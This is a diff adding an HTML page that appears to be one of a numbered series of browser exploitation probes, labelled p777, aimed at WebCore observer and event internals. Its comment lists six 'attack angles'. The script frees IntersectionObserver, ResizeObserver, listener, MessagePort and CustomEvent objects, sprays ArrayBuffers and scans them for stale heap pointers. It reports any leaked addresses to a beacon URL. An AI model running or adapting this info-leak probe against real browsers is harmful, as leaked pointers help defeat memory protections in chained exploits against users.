@@ -1,0 +1,427 @@
+<!--
+  p777: IntersectionObserver / ResizeObserver / EventTarget internal residue
+
+  IntersectionObserver and ResizeObserver are layout-driven observer APIs
+  backed by C++ objects in WebCore's rendering pipeline. Each observer
+  registers with the Document for layout change notifications and
+  maintains an internal list of observed targets with their last-known
+  geometry (IntersectionObserverEntry / ResizeObserverEntry).
+
+  Key insight: IntersectionObserver entries contain DOMRectReadOnly
+  objects (boundingClientRect, intersectionRect, rootBounds) -- each
+  a C++ DOMRect with 4 doubles (32 bytes). These are created per
+  notification and freed when the JS entry is GC'd. High-frequency
+  intersection changes (scrolling, resizing) generate many entries.
+
+  ResizeObserver entries contain ResizeObserverSize objects with width
+  and height. The observer's internal observation list holds pointers
+  to the observed elements and their cached sizes.
+
+  EventTarget's internal listener map (addEventListener/removeEventListener)
+  maintains a C++ EventListenerMap with entries per event type. Each
+  entry holds a vector of RegisteredEventListener objects. Bulk
+  add/remove of listeners exercises this allocator.
+
+  Additionally: MessageChannel/MessagePort create paired C++ port
+  objects with internal message queues. Posting many messages and
+  then closing ports frees queued message objects.
+
+  Attack angles:
+  A) IntersectionObserver entry flood via scroll then disconnect + spray.
+  B) ResizeObserver rapid resize churn then disconnect + spray.
+  C) EventTarget listener map bulk add/remove residue.
+  D) MessageChannel/MessagePort queue buffer residue.
+  E) CustomEvent detail object C++ wrapper residue.
+  F) IntersectionObserver rootMargin / threshold array allocation.
+
+  CRASH_CLASS: LOW (observer APIs, event handling, no side effects)
+  prior art: p773 (MutationObserver callback), p774 (DOM traversal)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p777</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p777-START');
+
+// === Section A: IntersectionObserver entry flood ===
+try{
+  b('A-intersection-observer');
+  var aHits=0;
+  var ioSupported=typeof IntersectionObserver!=='undefined';
+
+  if(!ioSupported){
+    b('A-SKIP no IntersectionObserver');
+  }else{
+    for(var round=0;round<3;round++){
+      var container=document.createElement('div');
+      container.style.cssText='height:200px;overflow:auto;position:relative;';
+      var content=document.createElement('div');
+      content.style.cssText='height:5000px;position:relative;';
+      container.appendChild(content);
+      document.body.appendChild(container);
+
+      var targets=[];
+      for(var i=0;i<50;i++){
+        var el=document.createElement('div');
+        el.style.cssText='position:absolute;top:'+(i*100)+'px;width:50px;height:50px;background:red;';
+        content.appendChild(el);
+        targets.push(el);
+      }
+
+      var entryCount=0;
+      var rectCount=0;
+      var observers=[];
+      for(var oi=0;oi<10;oi++){
+        var obs=new IntersectionObserver(function(entries){
+          entryCount+=entries.length;
+          for(var i=0;i<entries.length;i++){
+            var e=entries[i];
+            if(e.boundingClientRect)rectCount++;
+            if(e.intersectionRect)rectCount++;
+            if(e.rootBounds)rectCount++;
+          }
+        },{root:container,threshold:[0,0.25,0.5,0.75,1.0]});
+
+        for(var ti=0;ti<targets.length;ti++){
+          obs.observe(targets[ti]);
+        }
+        observers.push(obs);
+      }
+
+      for(var scroll=0;scroll<20;scroll++){
+        container.scrollTop=scroll*250;
+      }
+
+      if(round===0){
+        b('A entries='+entryCount+' rects='+rectCount+' observers='+observers.length);
+      }
+
+      for(var i=0;i<observers.length;i++){
+        observers[i].disconnect();
+      }
+      observers=null;
+      document.body.removeChild(container);
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+      var SIZES=[32,48,64,96,128];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        var szHits=0;
+        for(var i=0;i<200;i++){
+          var ab=new ArrayBuffer(sz);
+          var dv=new DataView(ab);
+          for(var off=0;off+8<=sz;off+=8){
+            if(isPtr(dv,off)){
+              szHits++;
+              if(szHits<=2)b('A-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+            }
+          }
+        }
+        aHits+=szHits;
+      }
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: ResizeObserver rapid resize churn ===
+try{
+  b('B-resize-observer');
+  var bHits=0;
+  var roSupported=typeof ResizeObserver!=='undefined';
+
+  if(!roSupported){
+    b('B-SKIP no ResizeObserver');
+  }else{
+    for(var round=0;round<3;round++){
+      var elements=[];
+      for(var i=0;i<30;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:'+((i+1)*10)+'px;height:'+((i+1)*5)+'px;background:blue;display:inline-block;';
+        document.body.appendChild(el);
+        elements.push(el);
+      }
+
+      var resizeEntries=0;
+      var observers=[];
+      for(var oi=0;oi<10;oi++){
+        var obs=new ResizeObserver(function(entries){
+          resizeEntries+=entries.length;
+        });
+        for(var ei=0;ei<elements.length;ei++){
+          obs.observe(elements[ei]);
+        }
+        observers.push(obs);
+      }
+
+      for(var step=0;step<20;step++){
+        for(var ei=0;ei<elements.length;ei++){
+          elements[ei].style.width=((ei+1)*10+step*5)+'px';
+          elements[ei].style.height=((ei+1)*5+step*3)+'px';
+        }
+        void document.body.offsetHeight;
+      }
+
+      if(round===0)b('B resize_entries='+resizeEntries);
+
+      for(var i=0;i<observers.length;i++){
+        observers[i].disconnect();
+      }
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      observers=null;elements=null;
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(96);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=96;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('B-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      bHits+=szHits;
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: EventTarget listener map bulk add/remove ===
+try{
+  b('C-event-listeners');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    var el=document.createElement('div');
+    document.body.appendChild(el);
+
+    var handlers=[];
+    var eventTypes=['click','mousedown','mouseup','mouseover','mouseout',
+      'keydown','keyup','focus','blur','input','change','scroll',
+      'touchstart','touchend','touchmove','pointerdown','pointerup',
+      'animationstart','animationend','transitionend'];
+
+    for(var ti=0;ti<eventTypes.length;ti++){
+      for(var hi=0;hi<20;hi++){
+        var handler=function(e){};
+        el.addEventListener(eventTypes[ti],handler);
+        handlers.push({type:eventTypes[ti],fn:handler});
+      }
+    }
+
+    if(round===0)b('C added '+handlers.length+' listeners across '+eventTypes.length+' types');
+
+    for(var i=0;i<handlers.length;i++){
+      el.removeEventListener(handlers[i].type,handlers[i].fn);
+    }
+    handlers=null;
+    document.body.removeChild(el);
+    el=null;
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[32,48,64,96];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('C-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      cHits+=szHits;
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: MessageChannel/MessagePort queue residue ===
+try{
+  b('D-message-channel');
+  var dHits=0;
+
+  if(typeof MessageChannel==='undefined'){
+    b('D-SKIP no MessageChannel');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var channels=[];
+        for(var i=0;i<50;i++){
+          var ch=new MessageChannel();
+          var received=0;
+          ch.port2.onmessage=function(e){received++;};
+
+          for(var j=0;j<20;j++){
+            ch.port1.postMessage({
+              idx:j,
+              round:round,
+              data:'message_payload_'+j+'_'+'y'.repeat(30+j)
+            });
+          }
+
+          ch.port1.close();
+          ch.port2.close();
+          channels.push(ch);
+        }
+        if(round===0)b('D created '+channels.length+' channels, 20 msgs each');
+        channels=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+      var SIZES=[48,64,96,128];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        var szHits=0;
+        for(var i=0;i<200;i++){
+          var ab=new ArrayBuffer(sz);
+          var dv=new DataView(ab);
+          for(var off=0;off+8<=sz;off+=8){
+            if(isPtr(dv,off)){
+              szHits++;
+              if(szHits<=2)b('D-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+            }
+          }
+        }
+        dHits+=szHits;
+      }
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: CustomEvent detail wrapper residue ===
+try{
+  b('E-custom-events');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    var el=document.createElement('div');
+    document.body.appendChild(el);
+
+    var received=0;
+    el.addEventListener('custom',function(e){
+      received++;
+    });
+
+    for(var i=0;i<200;i++){
+      var detail={
+        index:i,
+        payload:'event_data_'+round+'_'+i+'_'+'q'.repeat(40),
+        nested:{a:i*2,b:'inner_'+i,c:[1,2,3,i]}
+      };
+      var evt=new CustomEvent('custom',{detail:detail,bubbles:false});
+      el.dispatchEvent(evt);
+    }
+
+    if(round===0)b('E dispatched 200, received='+received);
+
+    el.removeEventListener('custom',function(){});
+    document.body.removeChild(el);
+    el=null;
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=128;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('E-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    eHits+=szHits;
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: IntersectionObserver rootMargin/threshold array ===
+try{
+  b('F-io-config');
+  var fHits=0;
+  var ioSupported=typeof IntersectionObserver!=='undefined';
+
+  if(!ioSupported){
+    b('F-SKIP');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var observers=[];
+        for(var i=0;i<100;i++){
+          var thresholds=[];
+          for(var t=0;t<=20;t++){
+            thresholds.push(t/20);
+          }
+          var obs=new IntersectionObserver(function(){},{
+            threshold:thresholds,
+            rootMargin:(10+i)+'px '+(20+i)+'px '+(30+i)+'px '+(40+i)+'px'
+          });
+          var el=document.createElement('div');
+          el.style.cssText='width:10px;height:10px;';
+          document.body.appendChild(el);
+          obs.observe(el);
+          observers.push({obs:obs,el:el});
+        }
+
+        if(round===0)b('F created '+observers.length+' observers with 21 thresholds each');
+
+        for(var i=0;i<observers.length;i++){
+          observers[i].obs.disconnect();
+          document.body.removeChild(observers[i].el);
+        }
+        observers=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+      var SIZES=[48,64,96,128,192];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        var szHits=0;
+        for(var i=0;i<200;i++){
+          var ab=new ArrayBuffer(sz);
+          var dv=new DataView(ab);
+          for(var off=0;off+8<=sz;off+=8){
+            if(isPtr(dv,off)){
+              szHits++;
+              if(szHits<=2)b('F-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+            }
+          }
+        }
+        fHits+=szHits;
+      }
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p777-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
